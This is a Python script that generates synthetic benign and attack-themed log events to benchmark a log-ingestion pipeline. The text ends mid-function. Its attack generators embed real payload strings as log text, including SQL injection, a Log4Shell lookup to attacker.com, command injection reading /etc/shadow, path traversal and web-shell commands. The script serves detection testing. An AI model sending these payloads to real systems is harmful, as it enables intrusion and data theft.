#!/usr/bin/env python3
"""
CLIF 2M Realistic Benchmark — TCP NDJSON to Vector port 9514
=============================================================
Generates ~2,000,000 realistic synthetic log events:
  - ~80% normal / benign traffic
  - ~20% attack / malicious traffic across diverse attack types

Attack types cover:
  - SSH brute force           - SQL injection (web)
  - Port scanning             - Privilege escalation
  - DGA / DNS tunnelling      - Data exfiltration
  - Lateral movement          - Web shell / RCE
  - Credential stuffing       - Malware C2 beaconing

Usage:
  python scripts/benchmark_2m_realistic.py                           # 2M events
  python scripts/benchmark_2m_realistic.py --count 500000            # custom
  python scripts/benchmark_2m_realistic.py --host 10.128.0.2         # remote
"""

import argparse
import json
import math
import random
import socket
import statistics
import string
import threading
import time
import uuid

# ─── Connection settings ──────────────────────────────────────────────────
VECTOR_HOST = "localhost"
VECTOR_PORT = 9514
BATCH_SIZE  = 10000
POOL_SIZE   = 10000   # pre-serialized event pool (recycled)

# ─── Realistic data pools ─────────────────────────────────────────────────
INTERNAL_HOSTS = [
    "web-prod-01", "web-prod-02", "web-prod-03",
    "api-prod-01", "api-prod-02",
    "db-master-01", "db-replica-01", "db-replica-02",
    "cache-prod-01", "cache-prod-02",
    "worker-01", "worker-02", "worker-03", "worker-04",
    "bastion-01", "jump-01",
    "k8s-node-01", "k8s-node-02", "k8s-node-03", "k8s-master-01",
    "ci-runner-01", "ci-runner-02",
    "mail-gw-01", "dns-prod-01", "dns-prod-02",
    "proxy-01", "proxy-02",
    "monitor-01", "log-collector-01",
    "vpn-gw-01", "nfs-01",
    "hr-workstation-12", "dev-laptop-07", "finance-ws-03",
]

NORMAL_USERS = [
    "deploy", "admin", "jsmith", "agarcia", "mchen", "klee",
    "rpatil", "tjones", "bwilson", "skim", "dpark", "lzhang",
    "svc-backup", "svc-monitor", "svc-deploy", "svc-ci",
    "www-data", "nginx", "postgres", "mysql",
]

ATTACKER_USERS = [
    "root", "admin", "test", "user", "guest", "oracle",
    "support", "backup", "ftpuser", "postgres", "ubuntu",
    "ec2-user", "pi", "nagios", "tomcat", "jenkins",
]

INTERNAL_IPS = (
    [f"10.0.1.{i}" for i in range(1, 60)]
    + [f"10.0.2.{i}" for i in range(1, 40)]
    + [f"192.168.1.{i}" for i in range(1, 30)]
    + [f"172.16.0.{i}" for i in range(1, 20)]
)

EXTERNAL_IPS_BENIGN = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222",
    "13.107.42.14", "140.82.121.4", "151.101.1.140",
    "52.84.150.11", "104.16.132.229", "172.217.14.206",
]

ATTACKER_IPS = [
    "45.33.32.156", "185.220.101.1", "91.92.109.87",
    "23.129.64.100", "198.51.100.10", "203.0.113.50",
    "104.248.50.87", "77.247.181.162", "89.163.249.244",
    "185.100.87.206", "195.206.105.217", "62.102.148.69",
    "46.166.139.111", "178.175.148.42", "193.189.100.203",
]

LEGIT_DOMAINS = [
    "api.example.com", "cdn.example.com", "auth.internal.corp",
    "updates.microsoft.com", "github.com", "pypi.org",
    "npm.registry.org", "docker.io", "ubuntu.com",
    "grafana.internal.corp", "prometheus.internal.corp",
    "jenkins.internal.corp", "gitlab.internal.corp",
    "ntp.ubuntu.com", "time.google.com",
]

DGA_DOMAINS = [
    "xk3jm9.evil.com", "qr7hnb2.malware.xyz", "a8dy3kw.bad-domain.cc",
    "p4mz9xv.c2-server.tk", "bk8n2qa.exfil.pw", "yw5ct7g.botnet.ml",
]

C2_DOMAINS = [
    "update-service.dynamic-dns.net", "cdn-static.cloud-sync.xyz",
    "api.legit-looking-service.com", "telemetry.app-analytics.info",
]

WEB_PATHS_NORMAL = [
    "/api/v1/users", "/api/v1/events", "/api/v1/metrics",
    "/api/v1/health", "/api/v1/status", "/api/v2/auth/token",
    "/dashboard", "/static/js/app.js", "/static/css/main.css",
    "/favicon.ico", "/robots.txt", "/.well-known/acme-challenge",
    "/api/v1/reports", "/api/v1/alerts", "/api/v1/search",
]

PROCESS_BINARIES_NORMAL = [
    "/usr/bin/python3", "/usr/bin/bash", "/usr/sbin/cron",
    "/usr/bin/node", "/usr/bin/java", "/usr/bin/docker",
    "/usr/sbin/nginx", "/usr/sbin/sshd", "/usr/bin/git",
    "/usr/bin/systemctl", "/usr/bin/journalctl",
    "/usr/bin/grep", "/usr/bin/find", "/usr/bin/awk",
    "/usr/lib/postgresql/14/bin/postgres",
]

PROCESS_BINARIES_SUSPICIOUS = [
    "/tmp/.X11-unix/payload", "/dev/shm/.hidden_proc",
    "/var/tmp/miner", "/tmp/reverse_shell.py",
    "/tmp/nc", "/tmp/ncat", "/tmp/socat",
    "/home/www-data/.cache/update", "/opt/.hidden/beacon",
]

# ─── Timestamp helpers ────────────────────────────────────────────────────
_ts_counter = [0]

def ts_now():
    """Generate slightly staggered timestamps within the test window."""
    _ts_counter[0] += 1
    offset_ms = _ts_counter[0] % 60000  # cycle within a minute
    t = time.time() + (offset_ms / 1000.0)
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(t)) + f".{int(offset_ms % 1000):03d}Z"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  NORMAL / BENIGN EVENTS  (~80%)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def normal_app_log():
    msgs = [
        f"Request processed in {random.randint(5, 1200)}ms: GET {random.choice(WEB_PATHS_NORMAL)} 200",
        f"Application startup completed in {random.randint(500, 8000)}ms",
        f"Cache hit ratio: {random.uniform(85, 99.5):.1f}% over last 300s",
        f"Garbage collection paused for {random.randint(5, 200)}ms (heap: {random.randint(200, 4000)}MB)",
        f"Configuration reloaded successfully, {random.randint(1, 50)} params updated",
        f"Scheduled task completed: {random.choice(['backup', 'cleanup', 'sync', 'index-rebuild', 'log-rotate'])}",
        f"Health check passed: all {random.randint(3, 12)} dependencies OK",
        f"Connection pool stats: active={random.randint(1, 50)} idle={random.randint(5, 30)} waiting=0",
        f"Batch job finished: processed {random.randint(100, 50000)} records in {random.randint(1, 120)}s",
        f"Database query completed: {random.randint(1, 500)} rows in {random.randint(1, 800)}ms",
        f"Message queue: {random.randint(0, 200)} pending, {random.randint(50, 5000)} processed/min",
        f"Worker thread pool: {random.randint(1, 16)} active, {random.randint(0, 4)} queued",
        f"API rate limiter: {random.randint(10, 500)} req/s (limit: 1000)",
        f"Session store: {random.randint(100, 5000)} active sessions",
        f"TLS certificate valid for {random.randint(30, 365)} more days",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": random.choice(["myapp", "nginx", "gunicorn", "uvicorn", "tomcat", "jvm"]),
        "level": random.choices(["INFO", "DEBUG", "WARNING"], weights=[70, 20, 10])[0],
        "hostname": random.choice(INTERNAL_HOSTS[:20]),
        "log_type": "syslog",
    }


def normal_auth_success():
    user = random.choice(NORMAL_USERS)
    ip = random.choice(INTERNAL_IPS)
    msgs = [
        f"Accepted publickey for {user} from {ip} port {random.randint(40000, 65535)} ssh2",
        f"session opened for user {user} by (uid=0)",
        f"pam_unix(sshd:session): session opened for user {user}(uid={random.randint(1000, 2000)})",
        f"Login successful: user={user} method=password src={ip}",
        f"Kerberos authentication succeeded for {user}@CORP.INTERNAL from {ip}",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": random.choice(["sshd", "pam", "auth"]),
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS),
        "ip_address": ip,
        "user_id": user,
        "log_type": "syslog",
        "status": "success",
        "auth_type": "password",
    }


def normal_session_close():
    user = random.choice(NORMAL_USERS)
    return {
        "timestamp": ts_now(),
        "message": f"session closed for user {user}",
        "source": "sshd",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS),
        "user_id": user,
        "log_type": "syslog",
        "status": "success",
    }


def normal_firewall_allow():
    src = random.choice(INTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    port = random.choice([22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9090, 9200])
    return {
        "timestamp": ts_now(),
        "message": f"Firewall ALLOW: SRC={src} DST={dst} PROTO=TCP DPT={port} LEN={random.randint(40, 1500)}",
        "source": "iptables",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS[:10]),
        "ip_address": src,
        "log_type": "firewall",
        "status": "allow",
        "src_ip": src,
        "dst_ip": dst,
        "dst_port": port,
    }


def normal_dns_query():
    domain = random.choice(LEGIT_DOMAINS)
    client = random.choice(INTERNAL_IPS)
    return {
        "timestamp": ts_now(),
        "message": f"query[A] {domain} from {client}",
        "source": "named",
        "level": "INFO",
        "hostname": random.choice(["dns-prod-01", "dns-prod-02"]),
        "ip_address": client,
        "log_type": "syslog",
        "dns_query": domain,
    }


def normal_process_event():
    binary = random.choice(PROCESS_BINARIES_NORMAL)
    pid = random.randint(1000, 65535)
    return {
        "timestamp": ts_now(),
        "message": f"Process started: {binary} (pid={pid})",
        "source": "tetragon",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS),
        "pid": pid,
        "ppid": random.randint(1, 500),
        "uid": random.choice([0, 1000, 1001, 33, 65534]),
        "binary_path": binary,
        "log_type": "syslog",
        "exit_code": 0,
    }


def normal_network_flow():
    src = random.choice(INTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS + EXTERNAL_IPS_BENIGN)
    port = random.choice([80, 443, 443, 443, 3306, 5432, 6379, 8080, 9090])
    return {
        "timestamp": ts_now(),
        "message": random.choice([
            "TCP connection established",
            "Connection closed gracefully",
            "TLS handshake complete",
            "HTTP/2 stream opened",
        ]),
        "source": "netflow",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS[:10]),
        "src_ip": src,
        "dst_ip": dst,
        "src_port": random.randint(32768, 65535),
        "dst_port": port,
        "protocol": "TCP",
        "log_type": "netflow",
        "bytes_sent": random.randint(100, 50000),
        "bytes_recv": random.randint(100, 200000),
    }


def normal_cron_job():
    tasks = ["logrotate", "certbot-renew", "backup-incremental", "metrics-collect",
             "apt-daily", "tmpwatch", "sysstat", "rkhunter"]
    return {
        "timestamp": ts_now(),
        "message": f"Cron job executed: /etc/cron.daily/{random.choice(tasks)}",
        "source": "cron",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS),
        "log_type": "syslog",
    }


def normal_system_metric():
    msgs = [
        f"Disk usage: {random.randint(10, 75)}% on /var/log",
        f"Memory utilization: {random.randint(30, 80)}% ({random.randint(2000, 12000)}MB / {random.choice([16384, 32768, 65536])}MB)",
        f"CPU load average: {random.uniform(0.1, 4.0):.2f} {random.uniform(0.1, 3.0):.2f} {random.uniform(0.1, 2.0):.2f}",
        f"Network interface eth0: RX {random.randint(1, 500)}MB/s TX {random.randint(1, 200)}MB/s",
        f"Swap usage: {random.randint(0, 15)}% ({random.randint(0, 2000)}MB / 8192MB)",
        f"Open file descriptors: {random.randint(100, 5000)} / 65535",
        f"IO wait: {random.uniform(0.1, 5.0):.1f}%",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": "collectd",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS),
        "log_type": "syslog",
    }


def normal_service_registration():
    services = ["web-api", "auth-service", "payment-gw", "notification-svc",
                "search-indexer", "cache-proxy", "worker-pool", "analytics-etl"]
    return {
        "timestamp": ts_now(),
        "message": f"Service {random.choice(services)} registered healthy, {random.randint(1, 5)} instances",
        "source": "consul",
        "level": "INFO",
        "hostname": random.choice(INTERNAL_HOSTS[:10]),
        "log_type": "syslog",
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ATTACK / MALICIOUS EVENTS  (~20%)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def attack_ssh_brute_force():
    """SSH brute force: rapid failed password attempts from attacker IP."""
    ip = random.choice(ATTACKER_IPS)
    user = random.choice(ATTACKER_USERS)
    port = random.randint(40000, 65535)
    msgs = [
        f"Failed password for {user} from {ip} port {port} ssh2",
        f"Failed password for invalid user {user} from {ip} port {port} ssh2",
        f"Invalid user {user} from {ip} port {port}",
        f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip} user={user}",
        f"Connection closed by authenticating user {user} {ip} port {port} [preauth]",
        f"Maximum authentication attempts exceeded for {user} from {ip} port {port} ssh2",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": "sshd",
        "level": random.choice(["WARNING", "ERROR"]),
        "hostname": random.choice(INTERNAL_HOSTS),
        "ip_address": ip,
        "user_id": user,
        "log_type": "syslog",
        "status": "fail",
        "auth_type": "password",
    }


def attack_credential_stuffing():
    """Credential stuffing: many different usernames from same IP."""
    ip = random.choice(ATTACKER_IPS)
    user = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
    msgs = [
        f"Failed password for {user} from {ip} port {random.randint(40000, 65535)} ssh2",
        f"authentication failure; logname= uid=0 euid=0 rhost={ip} user={user}",
        f"Invalid user {user} from {ip} port {random.randint(40000, 65535)}",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": "sshd",
        "level": "WARNING",
        "hostname": random.choice(["bastion-01", "jump-01", "vpn-gw-01"]),
        "ip_address": ip,
        "user_id": user,
        "log_type": "syslog",
        "status": "fail",
        "auth_type": "password",
    }


def attack_sql_injection():
    """SQL injection via web requests."""
    ip = random.choice(ATTACKER_IPS)
    payloads = [
        "GET /api/v1/users?id=1'+OR+1=1--+-",
        "GET /search?q=admin')+UNION+SELECT+username,password+FROM+users--",
        "POST /login HTTP/1.1 - body: username=admin'--&password=x",
        "GET /products?category=1;+DROP+TABLE+users;--",
        "GET /api/v1/users?sort=name'+AND+1=CONVERT(int,(SELECT+@@version))--",
        "GET /page?id=1+AND+SLEEP(5)--",
        "POST /api/v1/search - body: {\"filter\":\"' OR '1'='1\"}",
        "GET /api/v1/events?id=1+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--",
    ]
    return {
        "timestamp": ts_now(),
        "message": f"WAF alert: SQL injection attempt detected: {random.choice(payloads)} from {ip}",
        "source": "modsecurity",
        "level": "CRITICAL",
        "hostname": random.choice(["web-prod-01", "web-prod-02", "web-prod-03", "proxy-01"]),
        "ip_address": ip,
        "log_type": "syslog",
        "status": "deny",
    }


def attack_web_shell():
    """Web shell upload and execution attempts."""
    ip = random.choice(ATTACKER_IPS)
    shells = [
        "POST /uploads/shell.php HTTP/1.1 - 200 - cmd=id",
        "GET /wp-content/uploads/2026/backdoor.php?cmd=whoami HTTP/1.1",
        "POST /cgi-bin/test.cgi HTTP/1.1 - eval(base64_decode(...))",
        "GET /admin/config.php.bak HTTP/1.1 - 200",
        "POST /api/upload - filename: ../../../var/www/html/cmd.jsp",
    ]
    return {
        "timestamp": ts_now(),
        "message": f"Web shell activity detected: {random.choice(shells)} from {ip}",
        "source": "nginx",
        "level": "CRITICAL",
        "hostname": random.choice(["web-prod-01", "web-prod-02"]),
        "ip_address": ip,
        "log_type": "syslog",
        "status": "fail",
    }


def attack_port_scan():
    """Port scanning: connection attempts to many ports."""
    ip = random.choice(ATTACKER_IPS)
    target = random.choice(INTERNAL_IPS[:20])
    port = random.choice([21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                          993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017])
    return {
        "timestamp": ts_now(),
        "message": f"Firewall DENY: SRC={ip} DST={target} PROTO=TCP DPT={port} LEN=44 SYN",
        "source": "iptables",
        "level": "WARNING",
        "hostname": random.choice(INTERNAL_HOSTS[:5]),
        "ip_address": ip,
        "log_type": "firewall",
        "status": "deny",
        "src_ip": ip,
        "dst_ip": target,
        "dst_port": port,
    }


def attack_privilege_escalation():
    """Privilege escalation: unauthorized sudo, setuid abuse."""
    ip = random.choice(INTERNAL_IPS[:10])
    user = random.choice(["www-data", "nobody", "nginx", "postgres"])
    cmds = [
        f"sudo: {user} : TTY=pts/0 ; PWD=/tmp ; COMMAND=/bin/bash",
        f"Privilege escalation detected: {user} executed /bin/su as root",
        f"sudo: {user} : command not allowed ; TTY=pts/1 ; PWD=/var/www ; COMMAND=/usr/bin/passwd root",
        f"Security violation: user {user} attempted to modify /etc/shadow",
        f"setuid binary executed by unprivileged user: {user} ran /usr/bin/pkexec",
        f"Unauthorized capability change: {user} added CAP_SYS_ADMIN",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(cmds),
        "source": random.choice(["sudo", "pam", "auditd"]),
        "level": "CRITICAL",
        "hostname": random.choice(INTERNAL_HOSTS),
        "ip_address": ip,
        "user_id": user,
        "log_type": "syslog",
        "status": "fail",
    }


def attack_dga_dns():
    """DGA-style DNS queries: algorithmically generated domains."""
    ip = random.choice(INTERNAL_IPS[:20])
    # Generate realistic DGA domain
    tld = random.choice([".com", ".xyz", ".tk", ".cc", ".pw", ".ml", ".info"])
    domain_len = random.randint(8, 20)
    dga_domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=domain_len)) + tld
    msgs = [
        f"query[A] {dga_domain} from {ip} - NXDOMAIN",
        f"DNS query: {dga_domain} type=A class=IN from {ip} - SERVFAIL",
        f"Suspicious DNS query: {dga_domain} entropy={random.uniform(3.5, 4.5):.2f} from {ip}",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": "named",
        "level": "WARNING",
        "hostname": random.choice(["dns-prod-01", "dns-prod-02"]),
        "ip_address": ip,
        "log_type": "syslog",
        "dns_query": dga_domain,
    }


def attack_dns_tunnel():
    """DNS tunneling: large TXT queries to suspicious domains."""
    ip = random.choice(INTERNAL_IPS[:10])
    subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(30, 60)))
    domain = random.choice(C2_DOMAINS)
    return {
        "timestamp": ts_now(),
        "message": f"DNS exfiltration suspected: query[TXT] {subdomain}.{domain} from {ip} len={random.randint(200, 500)}",
        "source": "named",
        "level": "CRITICAL",
        "hostname": "dns-prod-01",
        "ip_address": ip,
        "log_type": "syslog",
        "dns_query": f"{subdomain}.{domain}",
    }


def attack_data_exfiltration():
    """Data exfiltration: large outbound transfers."""
    src = random.choice(INTERNAL_IPS[:20])
    dst = random.choice(ATTACKER_IPS)
    bytes_out = random.randint(50_000_000, 500_000_000)
    msgs = [
        f"Large outbound transfer: {src} -> {dst}:{random.choice([443, 8443, 9443])} {bytes_out} bytes in {random.randint(10, 300)}s",
        f"Data exfiltration alert: {bytes_out / 1_000_000:.0f}MB transferred to external host {dst}",
        f"Anomalous outbound: {src} uploaded {bytes_out / 1_000_000:.0f}MB to {dst} (baseline: 2MB/hr)",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": "netflow",
        "level": "CRITICAL",
        "hostname": random.choice(INTERNAL_HOSTS[:10]),
        "ip_address": src,
        "src_ip": src,
        "dst_ip": dst,
        "log_type": "netflow",
        "bytes_sent": bytes_out,
        "bytes_recv": random.randint(100, 5000),
        "protocol": "TCP",
        "dst_port": random.choice([443, 8443]),
    }


def attack_lateral_movement():
    """Lateral movement: internal host-to-host suspicious activity."""
    src = random.choice(INTERNAL_IPS[:10])
    dst = random.choice(INTERNAL_IPS[10:30])
    user = random.choice(["admin", "svc-backup", "root"])
    msgs = [
        f"Lateral movement detected: {src} -> {dst} port 22 user={user}",
        f"PsExec-like activity: {src} executed remote command on {dst} as {user}",
        f"WMI remote execution from {src} targeting {dst}: cmd.exe /c whoami",
        f"Internal SSH from {src} to {dst} after initial compromise indicator",
        f"SMB connection: {src} -> {dst} port 445 ADMIN$ share accessed by {user}",
        f"Pass-the-hash detected: {user} used NTLM auth from {src} to {dst}",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(msgs),
        "source": random.choice(["sshd", "auditd", "sysmon"]),
        "level": "CRITICAL",
        "hostname": random.choice(INTERNAL_HOSTS),
        "ip_address": src,
        "user_id": user,
        "src_ip": src,
        "dst_ip": dst,
        "log_type": "syslog",
        "status": "success",
    }


def attack_malware_c2():
    """Malware C2 beaconing: periodic connections to C2 servers."""
    src = random.choice(INTERNAL_IPS[:15])
    dst = random.choice(ATTACKER_IPS)
    domain = random.choice(C2_DOMAINS)
    return {
        "timestamp": ts_now(),
        "message": f"C2 beacon detected: {src} -> {dst} ({domain}) interval={random.choice([30, 60, 120, 300])}s payload={random.randint(50, 500)}B",
        "source": "ids",
        "level": "CRITICAL",
        "hostname": random.choice(INTERNAL_HOSTS[:15]),
        "ip_address": src,
        "src_ip": src,
        "dst_ip": dst,
        "log_type": "syslog",
        "dns_query": domain,
        "bytes_sent": random.randint(50, 500),
        "bytes_recv": random.randint(100, 2000),
    }


def attack_suspicious_process():
    """Suspicious process execution: miners, reverse shells."""
    binary = random.choice(PROCESS_BINARIES_SUSPICIOUS)
    pid = random.randint(10000, 65535)
    user = random.choice(["www-data", "nobody", "nginx"])
    cmds = [
        f"Process started: {binary} (pid={pid}) by user {user}",
        f"Suspicious binary execution: {binary} spawned by pid 1 as {user}",
        f"Process exec: {binary} args=['-e', '/bin/bash', '-i'] (pid={pid})",
    ]
    return {
        "timestamp": ts_now(),
        "message": random.choice(cmds),
        "source": "tetragon",
        "level": "CRITICAL",
        "hostname": random.choice(INTERNAL_HOSTS),
        "pid": pid,
        "ppid": random.randint(1, 100),
        "uid": random.choice([33, 65534, 0]),
        "binary_path": binary,
        "user_id": user,
        "log_type": "syslog",
    }


def attack_rce_attempt():
    """Remote code execution attempts via web."""
    ip = random.choice(ATTACKER_IPS)
    payloads = [
        "GET /api?cmd=${jndi:ldap://attacker.com/exploit} - Log4Shell attempt",
        "POST /api/exec - body: {\"cmd\":\"cat /etc/passwd\"} - RCE attempt",
        "GET /cgi-bin/test?;cat+/etc/shadow HTTP/1.1 - OS command injection",
        "POST /xmlrpc.php - pingback: <?xml version=\"1.0\"?><methodCall><methodName>system.exec</methodName>",
        "GET /..%2f..%2f..%2fetc%2fpasswd HTTP/1.1 - path traversal",
        "GET /actuator/env HTTP/1.1 200 - Spring Boot actuator exposed",
    ]
    return {
        "timestamp": ts_now(),
        "message": f"RCE attempt blocked: {random.choice(payloads)} from {ip}",
        "source": "waf",
        "level": "CRITICAL",
        "hostname": random.choice(["web-prod-01", "web-prod-02", "proxy-01"]),
        "ip_address": ip,
        "log_type": "syslog",
        "status": "deny",
    }


# ─── Generator distributions ──────────────────────────────────────────────

# Normal generators with relative weights (sum ≈ 80%)
NORMAL_GENERATORS = [
    (normal_app_log, 25),
    (normal_auth_success, 8),
    (normal_session_close, 5),
    (normal_firewall_allow, 10),
    (normal_dns_query, 8),
    (normal_process_event, 5),
    (normal_network_flow, 8),
    (normal_cron_job, 4),
    (normal_system_metric, 4),
    (normal_service_registration, 3),
]

# Attack generators with relative weights (sum ≈ 20%)
ATTACK_GENERATORS = [
    (attack_ssh_brute_force, 4.0),
    (attack_credential_stuffing, 2.0),
    (attack_sql_injection, 2.0),
    (attack_web_shell, 1.0),
    (attack_port_scan, 3.0),
    (attack_privilege_escalation, 1.5),
    (attack_dga_dns, 1.5),
    (attack_dns_tunnel, 0.5),
    (attack_data_exfiltration, 1.0),
    (attack_lateral_movement, 1.0),
    (attack_malware_c2, 1.0),
    (attack_suspicious_process, 1.0),
    (attack_rce_attempt, 1.5),
]

# Pre-compute cumulative weights for fast selection
def _build_cdf(generators):
    total = sum(w for _, w in generators)
    cdf = []
    cumulative = 0.0
    for fn, w in generators:
        cumulative += w / total
        cdf.append((fn, cumulative))
    return cdf

NORMAL_CDF = _build_cdf(NORMAL_GENERATORS)
ATTACK_CDF = _build_cdf(ATTACK_GENERATORS)


def pick_generator(cdf):
    r = random.random()
    for fn, threshold in cdf:
        if r <= threshold:
            return fn
    return cdf[-1][0]


def generate_event():
    """Generate a single event: 80% normal, 20% attack."""
    if random.random() < 0.80:
        return pick_generator(NORMAL_CDF)()
    else:
        return pick_generator(ATTACK_CDF)()


def build_payloads(pool_size, batch_size):
    """Pre-serialize event pool into ready-to-send batch payloads.
    Returns (list_of_bytes_payloads, normal_ratio).
    """
    lines = []
    n_count = 0
    for _ in range(pool_size):
        evt = generate_event()
        evt = {k: v for k, v in evt.items() if v is not None}
        if not (evt.get("level") in ("CRITICAL", "ERROR") or evt.get("status") in ("fail", "deny")):
            n_count += 1
        lines.append(json.dumps(evt, separators=(",", ":")).encode("utf-8"))
    normal_ratio = n_count / pool_size

    # Pre-assemble batch payloads (cycle through lines)
    newline = b"\n"
    payloads = []
    num_batches = max(pool_size // batch_size, 4)
    idx = 0
    for _ in range(num_batches):
        chunk = []
        for _ in range(batch_size):
            chunk.append(lines[idx % pool_size])
            idx += 1
        payloads.append(newline.join(chunk) + newline)

    return payloads, normal_ratio


def _make_socket(host, port):
    """Create an optimised TCP socket."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
    sock.connect((host, port))
    return sock


class AtomicCounters:
    def __init__(self):
        self.lock = threading.Lock()
        self.sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.batch_latencies = []    # per-batch send time in ms
        self.connect_times = []      # per-worker connect time in ms
        self.interval_eps = []       # EPS at each reporting interval
        self.worker_stats = {}       # worker_id -> {sent, errors, bytes}
        self.first_send_ts = None    # timestamp of first successful send

    def add(self, sent, nbytes=0, errors=0, latency_ms=None, worker_id=None):
        with self.lock:
            self.sent += sent
            self.bytes_sent += nbytes
            self.errors += errors
            if latency_ms is not None:
                self.batch_latencies.append(latency_ms)
            if self.first_send_ts is None and sent > 0:
                self.first_send_ts = time.monotonic()
            if worker_id is not None:
                ws = self.worker_stats.setdefault(worker_id, {"sent": 0, "errors": 0, "bytes": 0})
                ws["sent"] += sent
                ws["bytes"] += nbytes
                ws["errors"] += errors

    def add_connect_time(self, ms):
        with self.lock:
            self.connect_times.append(ms)

    def record_interval_eps(self, eps):
        with self.lock:
            self.interval_eps.append(eps)

    def snapshot(self):
        with self.lock:
            return self.sent, self.errors, self.bytes_sent

    def get_full_stats(self):
        with self.lock:
            return {
                "sent": self.sent,
                "bytes_sent": self.bytes_sent,
                "errors": self.errors,
                "batch_latencies": list(self.batch_latencies),
                "connect_times": list(self.connect_times),
                "interval_eps": list(self.interval_eps),
                "worker_stats": dict(self.worker_stats),
                "first_send_ts": self.first_send_ts,
            }


def worker_fn(worker_id, host, port, count, batch_size, payloads, counters, stop_event):
    """Worker thread — ZERO CPU work, just sendall() which releases the GIL."""
    t_conn = time.monotonic()
    try:
        sock = _make_socket(host, port)
        conn_ms = (time.monotonic() - t_conn) * 1000
        counters.add_connect_time(conn_ms)
    except Exception as e:
        print(f"  Worker-{worker_id}: connect failed: {e}")
        counters.add(0, errors=1, worker_id=worker_id)
        return

    local_sent = 0
    local_errors = 0
    num_payloads = len(payloads)
    pidx = worker_id % num_payloads

    try:
        while local_sent < count and not stop_event.is_set():
            remaining = count - local_sent
            cur = min(batch_size, remaining)
            payload = payloads[pidx % num_payloads]
            try:
                t_send = time.monotonic()
                sock.sendall(payload)
                latency_ms = (time.monotonic() - t_send) * 1000
                local_sent += cur
                counters.add(cur, nbytes=len(payload), latency_ms=latency_ms, worker_id=worker_id)
                pidx += 1
            except Exception:
                local_errors += 1
                counters.add(0, errors=1, worker_id=worker_id)
                if local_errors > 5:
                    break
                try:
                    sock.close()
                except Exception:
                    pass
                time.sleep(0.3)
                try:
                    t_conn = time.monotonic()
                    sock = _make_socket(host, port)
                    conn_ms = (time.monotonic() - t_conn) * 1000
                    counters.add_connect_time(conn_ms)
                except Exception:
                    break
    except Exception:
        pass
    finally:
        try:
            sock.close()
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(description="CLIF 2M Realistic Benchmark")
    parser.add_argument("--count", type=int, default=2_000_000, help="Total events (default: 2M)")
    parser.add_argument("--batch", type=int, default=BATCH_SIZE, help="Events per TCP send (default: 10000)")
    parser.add_argument("--host", type=str, default=VECTOR_HOST, help="Vector host")
    parser.add_argument("--port", type=int, default=VECTOR_PORT, help="Vector TCP JSON port")
    parser.add_argument("--workers", type=int, default=8, help="Parallel workers (default: 8)")
    args = parser.parse_args()

    total = args.count
    batch_size = args.batch
    num_workers = args.workers

    per_worker = total // num_workers
    remainder = total % num_workers

    print(f"\n{'=' * 70}")
    print(f"  CLIF 2M Realistic Benchmark  (pre-built payload mode)")
    print(f"{'=' * 70}")
    print(f"  Total events:  {total:,}")
    print(f"  Distribution:  ~80% normal / ~20% attack")
    print(f"  Target:        {args.host}:{args.port}")
    print(f"  Batch size:    {batch_size:,}")
    print(f"  Workers:       {num_workers}")
    print(f"{'=' * 70}")
    print(f"  Attack types:  SSH brute force, credential stuffing, SQL injection,")
    print(f"                 web shell, port scan, priv escalation, DGA DNS,")
    print(f"                 DNS tunnel, data exfil, lateral movement, C2, RCE")
    print(f"{'=' * 70}")

    print(f"\n  Pre-building {POOL_SIZE:,} events into batch payloads... ", end="", flush=True)
    t_pool = time.monotonic()
    payloads, normal_ratio = build_payloads(POOL_SIZE, batch_size)
    t_pool_done = time.monotonic() - t_pool
    payload_mb = sum(len(p) for p in payloads) / (1024 * 1024)
    print(f"done in {t_pool_done:.1f}s  ({len(payloads)} payloads, {payload_mb:.1f} MB)")

    counters = AtomicCounters()
    stop_event = threading.Event()

    threads = []
    for i in range(num_workers):
